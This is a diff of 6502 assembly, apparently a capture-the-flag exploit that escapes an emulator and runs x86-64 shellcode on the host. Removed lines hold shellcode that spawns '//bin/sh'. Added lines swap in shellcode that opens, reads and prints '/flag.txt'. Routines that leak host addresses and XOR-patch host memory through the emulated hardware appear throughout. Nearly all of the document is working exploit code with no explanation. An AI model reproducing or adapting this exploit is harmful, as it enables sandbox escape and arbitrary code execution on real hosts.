@@ -21,10 +21,10 @@
 	.export		_xorAt
 	.export		_putchar
 	.export		_get_data
-	.export		_set_ppu_data
-	.export		_libc_addr
 	.export		_leak
 	.export		_log64
+	.export		_dump
+	.export		_debug
 	.export		_main
 
 .segment	"DATA"
@@ -42,36 +42,68 @@ _shellcode:
 	.byte	$F6
 	.byte	$48
 	.byte	$BB
-	.byte	$2F
-	.byte	$2F
-	.byte	$62
-	.byte	$69
-	.byte	$6E
-	.byte	$2F
-	.byte	$73
-	.byte	$68
+	.byte	$6C
+	.byte	$6F
+	.byte	$6C
+	.byte	$6C
+	.byte	$6F
+	.byte	$6C
+	.byte	$6C
+	.byte	$74
 	.byte	$48
 	.byte	$C1
 	.byte	$EB
-	.byte	$08
+	.byte	$38
+	.byte	$53
+	.byte	$48
+	.byte	$BB
+	.byte	$2F
+	.byte	$66
+	.byte	$6C
+	.byte	$61
+	.byte	$67
+	.byte	$2E
+	.byte	$74
+	.byte	$78
 	.byte	$53
 	.byte	$48
 	.byte	$89
 	.byte	$E7
 	.byte	$B0
-	.byte	$3B
+	.byte	$02
 	.byte	$0F
 	.byte	$05
+	.byte	$48
+	.byte	$89
+	.byte	$C7
+	.byte	$48
+	.byte	$31
+	.byte	$C0
+	.byte	$48
+	.byte	$89
+	.byte	$E6
+	.byte	$BA
+	.byte	$00
+	.byte	$01
+	.byte	$00
+	.byte	$00
+	.byte	$0F
+	.byte	$05
+	.byte	$48
+	.byte	$89
+	.byte	$C2
+	.byte	$B8
+	.byte	$01
 	.byte	$00
 	.byte	$00
 	.byte	$00
+	.byte	$BF
+	.byte	$01
 	.byte	$00
 	.byte	$00
 	.byte	$00
-	.byte	$00
-	.byte	$00
-	.byte	$00
-	.byte	$00
+	.byte	$0F
+	.byte	$05
 	.byte	$00
 	.byte	$00
 	.byte	$00
@@ -96,11 +128,6 @@ _pattern:
 	.byte	$00
 	.byte	$00
 
-.segment	"BSS"
-
-_libc_addr:
-	.res	8,$00
-
 ; ---------------------------------------------------------------
 ; void __near__ reset (void)
 ; ---------------------------------------------------------------
@@ -111,14 +138,6 @@ _libc_addr:
 
 .segment	"CODE"
 
-	lda     #$00
-	jsr     _bka
-	lda     #$00
-	jsr     _bka
-	lda     #$00
-	jsr     _bka
-	lda     #$00
-	jsr     _bka
 	lda     #$00
 	jsr     _bka
 	lda     #$00
@@ -157,7 +176,7 @@ _libc_addr:
 	ldy     #$0F
 	jsr     ldeaxysp
 	jsr     tosulteax
-	beq     L005A
+	beq     L0072
 	jsr     pushw0sp
 	ldy     #$11
 	jsr     ldeaxysp
@@ -167,15 +186,15 @@ _libc_addr:
 	jsr     tossubeax
 	ldy     #$01
 	jsr     deceaxy
-	jmp     L01AA
-L005A:	jsr     pushw0sp
+	jmp     L01A5
+L0072:	jsr     pushw0sp
 	ldy     #$11
 	jsr     ldeaxysp
 	jsr     pusheax
 	ldy     #$0D
 	jsr     ldeaxysp
 	jsr     tossubeax
-L01AA:	ldy     #$00
+L01A5:	ldy     #$00
 	jsr     steaxspidx
 	ldy     #$14
 	jmp     addysp
@@ -196,16 +215,16 @@ L01AA:	ldy     #$00
 	jsr     decsp2
 	ldx     #$00
 	txa
-L01AF:	jsr     stax0sp
+L01AA:	jsr     stax0sp
 	cmp     #$04
 	txa
 	sbc     #$00
-	bvc     L0069
+	bvc     L0081
 	eor     #$80
-L0069:	asl     a
+L0081:	asl     a
 	lda     #$00
 	tax
-	bcc     L01AC
+	bcc     L01A7
 	ldy     #$06
 	jsr     ldeaxysp
 	jsr     pusheax
@@ -225,14 +244,14 @@ L0069:	asl     a
 	jsr     _bka
 	jsr     ldax0sp
 	jsr     incax1
-	jmp     L01AF
-L01AC:	jsr     stax0sp
+	jmp     L01AA
+L01A7:	jsr     stax0sp
 	cmp     #$04
 	txa
 	sbc     #$00
-	bvc     L0077
+	bvc     L008F
 	eor     #$80
-L0077:	bpl     L0071
+L008F:	bpl     L0089
 	ldy     #$0A
 	jsr     ldeaxysp
 	jsr     pusheax
@@ -252,8 +271,8 @@ L0077:	bpl     L0071
 	jsr     _bka
 	jsr     ldax0sp
 	jsr     incax1
-	jmp     L01AC
-L0071:	ldy     #$02
+	jmp     L01A7
+L0089:	ldy     #$02
 	lda     (sp),y
 	jsr     _bkx
 	jsr     _reset
@@ -276,13 +295,13 @@ L0071:	ldy     #$02
 	jsr     decsp2
 	ldx     #$00
 	txa
-L01B1:	jsr     stax0sp
+L01AC:	jsr     stax0sp
 	cmp     #$04
 	txa
 	sbc     #$00
-	bvc     L0089
+	bvc     L00A1
 	eor     #$80
-L0089:	bpl     L0083
+L00A1:	bpl     L009B
 	ldy     #$06
 	jsr     ldeaxysp
 	jsr     pusheax
@@ -302,8 +321,8 @@ L0089:	bpl     L0083
 	jsr     _bka
 	jsr     ldax0sp
 	jsr     incax1
-	jmp     L01B1
-L0083:	ldy     #$02
+	jmp     L01AC
+L009B:	ldy     #$02
 	lda     (sp),y
 	jsr     _bkx
 	jsr     _reset
@@ -359,24 +378,6 @@ L0083:	ldy     #$02
 .endproc
 
 ; ---------------------------------------------------------------
-; void __near__ set_ppu_data (unsigned char)
-; ---------------------------------------------------------------
-
-.segment	"CODE"
-
-.proc	_set_ppu_data: near
-
-.segment	"CODE"
-
-	jsr     pusha
-	ldy     #$00
-	lda     (sp),y
-	sta     $2007
-	jmp     incsp1
-
-.endproc
-
-; ---------------------------------------------------------------
 ; void __near__ leak (unsigned int, __near__ unsigned long *, __near__ unsigned long *)
 ; ---------------------------------------------------------------
 
@@ -393,9 +394,9 @@ L0083:	ldy     #$02
 	jsr     _get_data
 	lda     #$00
 	tay
-L01B8:	sta     (sp),y
+L01B3:	sta     (sp),y
 	cmp     #$04
-	bcs     L01B4
+	bcs     L01AF
 	ldy     #$02
 	jsr     ldaxysp
 	jsr     pushax
@@ -430,13 +431,13 @@ L01B8:	sta     (sp),y
 	lda     (sp),y
 	clc
 	adc     #$01
-	jmp     L01B8
-L01B4:	tya
+	jmp     L01B3
+L01AF:	tya
 	sta     (sp),y
 	tax
-L01B6:	lda     (sp),y
+L01B1:	lda     (sp),y
 	cmp     #$04
-	bcs     L01B7
+	bcs     L01B2
 	ldy     #$04
 	jsr     ldaxysp
 	jsr     pushax
@@ -473,8 +474,8 @@ L01B6:	lda     (sp),y
 	clc
 	adc     #$01
 	sta     (sp),y
-	jmp     L01B6
-L01B7:	txa
+	jmp     L01B1
+L01B2:	txa
 	jsr     _get_data
 	jmp     incsp7
 
@@ -499,9 +500,9 @@ L01B7:	txa
 	jsr     _putchar
 	lda     #$00
 	tay
-L01BE:	sta     (sp),y
+L01B9:	sta     (sp),y
 	cmp     #$04
-	bcs     L01BB
+	bcs     L01B6
 	ldy     #$04
 	jsr     ldeaxysp
 	jsr     pusheax
@@ -516,11 +517,11 @@ L01BE:	sta     (sp),y
 	lda     (sp),y
 	clc
 	adc     #$01
-	jmp     L01BE
-L01BB:	tya
-L01BF:	sta     (sp),y
+	jmp     L01B9
+L01B6:	tya
+L01BA:	sta     (sp),y
 	cmp     #$04
-	bcs     L00D7
+	bcs     L00EB
 	ldy     #$08
 	jsr     ldeaxysp
 	jsr     pusheax
@@ -535,8 +536,8 @@ L01BF:	sta     (sp),y
 	lda     (sp),y
 	clc
 	adc     #$01
-	jmp     L01BF
-L00D7:	lda     #$41
+	jmp     L01BA
+L00EB:	lda     #$41
 	jsr     _putchar
 	lda     #$42
 	jsr     _putchar
@@ -544,6 +545,66 @@ L00D7:	lda     #$41
 	jsr     _putchar
 	ldy     #$09
 	jmp     addysp
+
+.endproc
+
+; ---------------------------------------------------------------
+; void __near__ dump (unsigned long)
+; ---------------------------------------------------------------
+
+.segment	"CODE"
+
+.proc	_dump: near
+
+.segment	"CODE"
+
+	jsr     pusheax
+	jsr     decsp1
+	lda     #$00
+	tay
+L01BD:	sta     (sp),y
+	cmp     #$FF
+	bcs     L00FE
+	ldy     #$04
+	jsr     ldeaxysp
+	jsr     pusheax
+	ldy     #$04
+	ldx     #$00
+	lda     (sp),y
+	jsr     axulong
+	jsr     tosaddeax
+	jsr     pusheax
+	lda     #$00
+	jsr     _xorAt
+	ldy     #$00
+	lda     (sp),y
+	clc
+	adc     #$01
+	jmp     L01BD
+L00FE:	ldy     #$04
+	jsr     ldeaxysp
+	ldy     #$FF
+	jsr     inceaxy
+	jsr     pusheax
+	lda     #$00
+	jsr     _xorAt
+	jmp     incsp5
+
+.endproc
+
+; ---------------------------------------------------------------
+; void __near__ debug (void)
+; ---------------------------------------------------------------
+
+.segment	"CODE"
+
+.proc	_debug: near
+
+.segment	"CODE"
+
+	lda     #$01
+L01BF:	sta     $4016
+	jmp     L01BF
 
 .endproc
 
@@ -557,51 +618,8 @@ L00D7:	lda     #$41
 
 .segment	"CODE"
 
-	ldy     #$2A
+	ldy     #$22
 	jsr     subysp
-	ldx     #$2D
-	lda     #$0A
-	sta     sreg
-	lda     #$00
-	sta     sreg+1
-	lda     #$7C
-	jsr     pusheax
-	jsr     pushl0
-	lda     #$04
-	jsr     _xorAt64
-	ldx     #$00
-	stx     sreg
-	stx     sreg+1
-	txa
-	ldy     #$12
-	jsr     steaxysp
-	ldy     #$16
-	jsr     steaxysp
-	ldx     #$1E
-	lda     #$50
-	jsr     pushax
-	lda     #$14
-	jsr     leaa0sp
-	jsr     pushax
-	lda     #$1A
-	jsr     leaa0sp
-	jsr     _leak
-	ldy     #$15
-	jsr     ldeaxysp
-	jsr     pusheax
-	ldy     #$1D
-	jsr     ldeaxysp
-	jsr     _log64
-	ldx     #$2D
-	lda     #$0A
-	sta     sreg
-	lda     #$00
-	sta     sreg+1
-	lda     #$7C
-	jsr     pusheax
-	jsr     pushl0
-	lda     #$04
-	jsr     _xorAt64
 	ldx     #$2D
 	lda     #$0A
 	sta     sreg
@@ -612,48 +630,6 @@ L00D7:	lda     #$41
 	jsr     pushl0
 	lda     #$01
 	jsr     _xorAt64
-	ldx     #$2D
-	lda     #$0A
-	sta     sreg
-	lda     #$00
-	sta     sreg+1
-	lda     #$7D
-	jsr     pusheax
-	jsr     pushl0
-	jsr     _xorAt64
-	ldx     #$00
-	stx     sreg
-	stx     sreg+1
-	txa
-	ldy     #$22
-	jsr     steaxysp
-	ldy     #$26
-	jsr     steaxysp
-	ldx     #$12
-	lda     #$10
-	jsr     pushax
-	lda     #$24
-	jsr     leaa0sp
-	jsr     pushax
-	lda     #$2A
-	jsr     leaa0sp
-	jsr     _leak
-	ldx     #$30
-	lda     #$00
-	sta     sreg
-	sta     sreg+1
-	ldy     #$26
-	jsr     lsubeqysp
-	ldy     #$29
-	jsr     ldeaxysp
-	jsr     pusheax
-	ldx     #$FF
-	stx     sreg
-	stx     sreg+1
-	lda     #$00
-	jsr     tosandeax
-	ldy     #$26
-	jsr     steaxysp
 	ldx     #$00
 	stx     sreg
 	stx     sreg+1
@@ -662,8 +638,8 @@ L00D7:	lda     #$41
 	jsr     steaxysp
 	ldy     #$1E
 	jsr     steaxysp
-	ldx     #$11
-	lda     #$80
+	ldx     #$03
+	lda     #$F0
 	jsr     pushax
 	lda     #$1C
 	jsr     leaa0sp
@@ -671,36 +647,69 @@ L00D7:	lda     #$41
 	lda     #$22
 	jsr     leaa0sp
 	jsr     _leak
-	ldx     #$13
-	lda     #$42
+	ldx     #$30
+	lda     #$00
+	sta     sreg
+	sta     sreg+1
+	ldy     #$1E
+	jsr     lsubeqysp
+	ldy     #$21
+	jsr     ldeaxysp
+	jsr     pusheax
+	ldx     #$FF
+	stx     sreg
+	stx     sreg+1
+	lda     #$00
+	jsr     tosandeax
+	ldy     #$1E
+	jsr     steaxysp
+	ldx     #$00
+	stx     sreg
+	stx     sreg+1
+	txa
+	ldy     #$12
+	jsr     steaxysp
+	ldy     #$16
+	jsr     steaxysp
+	ldx     #$03
+	lda     #$D0
+	jsr     pushax
+	lda     #$14
+	jsr     leaa0sp
+	jsr     pushax
+	lda     #$1A
+	jsr     leaa0sp
+	jsr     _leak
+	ldx     #$53
+	lda     #$05
 	sta     sreg
 	lda     #$00
 	sta     sreg+1
 	lda     #$E0
-	ldy     #$1E
+	ldy     #$16
 	jsr     lsubeqysp
-	ldy     #$25
-	jsr     ldeaxysp
-	jsr     pusheax
-	ldy     #$2D
-	jsr     ldeaxysp
-	jsr     _log64
 	ldy     #$1D
 	jsr     ldeaxysp
 	jsr     pusheax
 	ldy     #$25
 	jsr     ldeaxysp
 	jsr     _log64
-	ldy     #$29
+	ldy     #$15
 	jsr     ldeaxysp
 	jsr     pusheax
-	ldy     #$29
+	ldy     #$1D
+	jsr     ldeaxysp
+	jsr     _log64
+	ldy     #$21
 	jsr     ldeaxysp
 	jsr     pusheax
-	ldy     #$29
+	ldy     #$21
 	jsr     ldeaxysp
 	jsr     pusheax
-	ldy     #$29
+	ldy     #$21
+	jsr     ldeaxysp
+	jsr     pusheax
+	ldy     #$21
 	jsr     ldeaxysp
 	jsr     pusheax
 	lda     #$1E
@@ -717,83 +726,50 @@ L00D7:	lda     #$41
 	jsr     _log64
 	lda     #$00
 	ldy     #$01
-L01D6:	sta     (sp),y
-	cmp     #$10
-	bcs     L01C2
+L01D1:	sta     (sp),y
+	cmp     #$4A
+	bcs     L01C3
 	lda     #<(_shellcode)
 	ldx     #>(_shellcode)
 	clc
 	adc     (sp),y
-	bcc     L0132
+	bcc     L0145
 	inx
-L0132:	jsr     pushax
+L0145:	jsr     pushax
 	sta     ptr1
 	stx     ptr1+1
-	ldx     #$00
-	lda     (ptr1,x)
-	jsr     pusha0
-	ldy     #$05
+	ldy     #$00
+	lda     (ptr1),y
+	sta     sreg
+	ldy     #$03
 	lda     (sp),y
-	tay
-	lda     _pattern,y
-	jsr     tosxora0
+	and     #$0F
+	sta     ptr1
+	lda     #$00
+	clc
+	adc     #>(_pattern)
+	sta     ptr1+1
+	ldy     #<(_pattern)
+	lda     (ptr1),y
+	eor     sreg
 	ldy     #$00
 	jsr     staspidx
 	ldy     #$01
 	lda     (sp),y
 	clc
 	adc     #$01
-	jmp     L01D6
-L01C2:	lda     #$00
-L01D7:	sta     (sp),y
+	jmp     L01D1
+L01C3:	lda     #$00
+L01D2:	sta     (sp),y
 	cmp     #$10
 	bcs     L01C6
-	ldx     #$00
-	lda     (sp),y
-	ldy     #$10
-	jsr     incaxy
-	clc
-	adc     #<(_shellcode)
-	tay
-	txa
-	adc     #>(_shellcode)
-	tax
-	tya
-	jsr     pushax
-	sta     ptr1
-	stx     ptr1+1
-	ldx     #$00
-	lda     (ptr1,x)
-	jsr     pusha0
-	ldy     #$05
-	lda     (sp),y
-	tay
-	lda     _pattern,y
-	jsr     tosxora0
-	ldy     #$00
-	jsr     staspidx
-	ldy     #$01
-	lda     (sp),y
-	clc
-	adc     #$01
-	jmp     L01D7
-L01C6:	lda     _pattern
-	eor     _shellcode+32
-	sta     _shellcode+32
-	lda     _pattern+1
-	eor     _shellcode+33
-	sta     _shellcode+33
-	lda     #$00
-L01D8:	sta     (sp),y
-	cmp     #$10
-	bcs     L01C9
 	lda     #<(_pattern)
 	ldx     #>(_pattern)
 	clc
 	adc     (sp),y
-	bcc     L0155
+	bcc     L0152
 	inx
-L0155:	sta     ptr1
+L0152:	sta     ptr1
 	stx     ptr1+1
 	dey
 	lda     (ptr1),y
@@ -803,19 +779,19 @@ L0155:	sta     ptr1
 	lda     (sp),y
 	clc
 	adc     #$01
-	jmp     L01D8
-L01C9:	lda     #$00
+	jmp     L01D2
+L01C6:	lda     #$00
 	dey
-L01D9:	sta     (sp),y
+L01D3:	sta     (sp),y
 	cmp     #$03
-	jcs     L0158
+	jcs     L0155
 	tya
 	iny
 	sta     (sp),y
 	tax
-L01CD:	lda     (sp),y
-	cmp     #$D0
-	bcs     L01CE
+L01CA:	lda     (sp),y
+	cmp     #$B0
+	bcs     L01CB
 	ldy     #$11
 	jsr     ldeaxysp
 	jsr     pusheax
@@ -845,19 +821,19 @@ L01CD:	lda     (sp),y
 	clc
 	adc     #$01
 	sta     (sp),y
-	jmp     L01CD
-L01CE:	stx     sreg
+	jmp     L01CA
+L01CB:	stx     sreg
 	stx     sreg+1
-	lda     #$D0
+	lda     #$B0
 	ldy     #$0E
 	jsr     laddeqysp
 	lda     #$00
 	ldy     #$01
 	sta     (sp),y
 	tax
-L01D0:	lda     (sp),y
-	cmp     #$22
-	bcs     L01D1
+L01CD:	lda     (sp),y
+	cmp     #$4A
+	bcs     L01CE
 	ldy     #$11
 	jsr     ldeaxysp
 	jsr     pusheax
@@ -881,30 +857,28 @@ L01D0:	lda     (sp),y
 	clc
 	adc     #$01
 	sta     (sp),y
-	jmp     L01D0
-L01D1:	stx     sreg
+	jmp     L01CD
+L01CE:	stx     sreg
 	stx     sreg+1
-	lda     #$30
+	lda     #$50
 	ldy     #$0E
 	jsr     laddeqysp
 	ldy     #$00
 	lda     (sp),y
 	clc
 	adc     #$01
-	jmp     L01D9
-L0158:	ldx     #$03
+	jmp     L01D3
+L0155:	ldx     #$03
 	tya
 	sta     sreg
 	sta     sreg+1
 	ldy     #$0E
 	jsr     lsubeqysp
-	jsr     _reset
-	jsr     _reset
-	ldy     #$29
+	ldy     #$21
 	jsr     ldeaxysp
 	ldy     #$02
 	jsr     steaxysp
-	ldy     #$29
+	ldy     #$21
 	jsr     ldeaxysp
 	jsr     pusheax
 	ldx     #$2D
@@ -934,19 +908,19 @@ L0158:	ldx     #$03
 	jsr     steaxysp
 	lda     #$00
 	ldy     #$01
-L01DA:	sta     (sp),y
+L01D4:	sta     (sp),y
 	cmp     #$04
-	bcs     L018B
+	bcs     L0186
 	ldx     #$00
 	lda     (sp),y
 	jsr     axulong
 	jsr     pusheax
-	ldx     #$B0
+	ldx     #$B1
 	lda     #$3F
 	sta     sreg
 	lda     #$00
 	sta     sreg+1
-	lda     #$38
+	lda     #$08
 	jsr     tosaddeax
 	jsr     pusheax
 	jsr     pushl0
@@ -964,8 +938,8 @@ L01DA:	sta     (sp),y
 	lda     (sp),y
 	clc
 	adc     #$01
-	jmp     L01DA
-L018B:	lda     #$47
+	jmp     L01D4
+L0186:	lda     #$47
 	jsr     _putchar
 	lda     #$47
 	jsr     _putchar
@@ -976,9 +950,9 @@ L018B:	lda     #$47
 	lda     #$47
 	jsr     _putchar
 	ldy     #$01
-L01D5:	lda     (sp),y
+	lda     (sp),y
 	sta     $4016
-	jmp     L01D5
+L01C0:	jmp     L01C0
 
 .endproc
 
